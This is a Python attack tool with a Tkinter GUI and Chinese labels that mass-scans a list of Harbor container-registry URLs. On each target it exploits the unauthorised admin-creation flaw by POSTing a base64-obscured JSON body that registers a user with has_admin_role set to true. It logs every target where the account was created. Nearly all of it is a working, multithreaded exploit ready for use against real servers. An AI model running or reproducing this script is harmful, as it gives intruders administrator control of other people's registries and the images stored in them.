import requests
import base64
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
from urllib3.exceptions import InsecureRequestWarning
def harbor_exp(url):
    poc = r"""/api/user"""
    url = url + poc
    data = base64.b64decode("eyJ1c2VybmFtZSI6IldvMWZoNGNrZXIiLCJlbWFpbCI6IldvMWZoNGNrZXJAcXEuY29tIiwicmVhbG5hbWUiOiJXbzFmaDRja2VyIiwicGFzc3dvcmQiOiJXbzFmaDRja2VyIiwiY29tbWVudCI6IjEiLCJoYXNfYWRtaW5fcm9sZSI6dHJ1ZX0=")
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        resp = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)
        if resp.status_code == 201:
            harbor_text.insert(END, "---------------------------------\n【！！！！！！】存在漏洞的url：" + url + "；成功创建账号:W01fh4cker 密码:W01fh4cker。" + "\n---------------------------------\n")
            harbor_text.see(END)
            with open("存在Harbor 未授权创建管理员漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
        else:
            harbor_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            harbor_text.see(END)
    except Exception as err:
        harbor_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        harbor_text.see(END)
def get_harbor_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def harbor_gui():
    harbor = tk.Tk()
    harbor.geometry("910x450")
    harbor.title("Harbor 未授权创建管理员漏洞一把梭")
    harbor.resizable(0, 0)
    harbor.iconbitmap('logo.ico')
    global harbor_text
    harbor_text = scrolledtext.ScrolledText(harbor,width=123, height=25)
    harbor_text.grid(row=0, column=0, padx=10, pady=10)
    harbor_text.see(END)
    addrs = get_harbor_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(harbor_exp, addr)
    harbor.mainloop()